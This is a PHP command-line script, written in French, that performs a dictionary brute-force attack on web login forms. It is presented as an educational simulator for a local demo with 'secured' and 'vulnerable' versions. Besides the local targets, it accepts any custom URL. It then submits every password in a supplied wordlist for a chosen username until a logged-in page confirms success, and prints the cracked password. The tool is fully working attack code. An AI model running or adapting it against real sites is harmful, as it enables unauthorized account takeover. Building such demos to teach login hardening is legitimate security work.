<?php
// Configuration


echo "=== Simulateur d'attaque par force brute ===\n";
echo "AVERTISSEMENT: Ce script est à utiliser uniquement à des fins éducatives sur vos propres systèmes.\n";

// Choix de la version à tester
echo "Quelle version souhaitez-vous tester?\n";
echo "1. Version sécurisée\n";
echo "2. Version vulnérable\n";
echo "3. Autre (URL personnalisée)\n";
echo "Votre choix [1]: ";
$version_choice = trim(fgets(STDIN));

if (empty($version_choice) || !is_numeric($version_choice) || $version_choice < 1 || $version_choice > 3) {
    $version_choice = 1;
}

// Configuration des URLs selon le choix
switch ($version_choice) {
    case 1:
        $target_url = 'http://localhost/security_demo/secured/login_process.php';
        $check_url = 'http://localhost/security_demo/secured/index.php';
        $logout_url = 'http://localhost/security_demo/secured/logout.php';
        echo "\nCible configurée: Version sécurisée\n";
        break;
    case 2:
        $target_url = 'http://localhost/security_demo/vulnerable/login_process.php';
        $check_url = 'http://localhost/security_demo/vulnerable/index.php';
        $logout_url = 'http://localhost/security_demo/vulnerable/logout.php';
        echo "\nCible configurée: Version vulnérable\n";
        break;
    case 3:
        // Demander l'URL cible
        echo "Entrez l'URL cible (ex: http://exemple.com/login.php): ";
        $target_url = trim(fgets(STDIN));
        
        // Demander si une URL de vérification est nécessaire
        echo "Avez-vous besoin d'une URL de vérification pour confirmer la connexion? (o/n) [o]: ";
        $need_check_url = strtolower(trim(fgets(STDIN)));
        
        if ($need_check_url === 'n' || $need_check_url === 'non') {
            $check_url = '';
        } else {
            echo "Entrez l'URL de vérification: ";
            $check_url = trim(fgets(STDIN));
        }
        break;
}

// Demander le nom d'utilisateur
echo "Entrez le nom d'utilisateur cible: ";
$username = trim(fgets(STDIN));

// Demander le chemin du fichier de liste de mots de passe
echo "Entrez le chemin vers le fichier de liste de mots de passe [wordlist.txt]: ";
$wordlist_file = trim(fgets(STDIN));

// Vérifier si le fichier de liste existe
if (!file_exists($wordlist_file)) {
    die("Erreur: Le fichier de liste '$wordlist_file' n'existe pas.\n");
}
// Lire la liste de mots de passe
$passwords = file($wordlist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
if (empty($passwords)) {
    die("Erreur: Le fichier de liste est vide.\n");
}
    
echo "Cible: $target_url\n";
echo "Utilisateur: $username\n";
echo "Nombre de mots de passe à tester: " . count($passwords) . "\n";
echo "Démarrage de l'attaque...\n";
echo "----------------------------------------\n";

// Initialiser les compteurs
$attempts = 0;
$start_time = microtime(true);
$success = false;
$found_password = '';

// Configurer CURL pour la session
$ch = curl_init();

// Boucle à travers chaque mot de passe
foreach ($passwords as $password) {
    $attempts++;
    
    // Afficher le progrès
    echo "Tentative $attempts: Essai du mot de passe '$password'";
    
    // Préparer les données POST
    $post_data = [
        'username' => $username,
        'password' => $password
    ];
    
    // Configurer la requête CURL
    curl_setopt($ch, CURLOPT_URL, $target_url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
    
    // Exécuter la requête
    $response = curl_exec($ch);
    
    // Vérifier si la connexion a réussi (redirection vers la page avec message de succès)
    $final_url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    
    // On fait une seconde requête pour vérifier si on est connecté 
    //exemple de check_url:http://localhost/security_demo/vulnerable/index.php
    curl_setopt($ch, CURLOPT_URL, $check_url);
   
    curl_setopt($ch, CURLOPT_POST, 0);
    $check_response = curl_exec($ch);
    
    if (strpos($check_response, 'Vous êtes connecté en tant que ' . $username) !== false) {
        echo " => SUCCÈS!\n";
        $success = true;
        $found_password = $password;
        break;
    } else {
        echo " => Échec\n";
    }
    
    // Petit délai pour éviter de surcharger le serveur
    usleep(100000); // 100ms
}
// Déconnexion après une connexion réussie
if ($success && !empty($logout_url)) {
    echo "\nConnexion réussie! Tentative de déconnexion...\n";
    curl_setopt($ch, CURLOPT_URL, $logout_url);
    curl_setopt($ch, CURLOPT_POST, 0);
    $logout_response = curl_exec($ch);
    echo "Déconnexion effectuée.\n";
    
    // Vérification que la déconnexion a fonctionné
    curl_setopt($ch, CURLOPT_URL, $check_url);
    $check_after_logout = curl_exec($ch);
    
    if (strpos($check_after_logout, 'Vous êtes connecté en tant que ' . $username) !== false) {
        echo "⚠️ Attention: Toujours connecté après tentative de déconnexion!\n";
    } else {
        echo "✅ Déconnexion confirmée.\n";
    }
} 
// Fermer la session CURL
curl_close($ch);

// Afficher les résultats
$elapsed_time = microtime(true) - $start_time;
echo "----------------------------------------\n";
echo "Attaque terminée.\n";
echo "Temps écoulé: " . round($elapsed_time, 2) . " secondes\n";
echo "Tentatives: $attempts\n";

if ($success) {
    echo "RÉSULTAT: Mot de passe trouvé: '$found_password'\n";
} else {
    echo "RÉSULTAT: Mot de passe non trouvé dans la liste fournie.\n";
}
echo "----------------------------------------\n";

